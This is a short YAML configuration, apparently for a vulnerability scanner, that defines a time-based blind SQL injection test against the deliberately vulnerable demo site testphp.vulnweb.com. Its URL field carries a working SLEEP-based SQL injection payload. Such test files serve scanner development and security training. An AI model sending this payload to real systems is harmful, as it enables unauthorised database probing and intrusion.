name: exploit
description: This file tests a blind sql injection on testphp.acunetix.com
module: sqli_blind
parameter:
    url: http://testphp.vulnweb.com/product.php?pic=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))Odgd)
    method: GET
    delay_seconds: 5
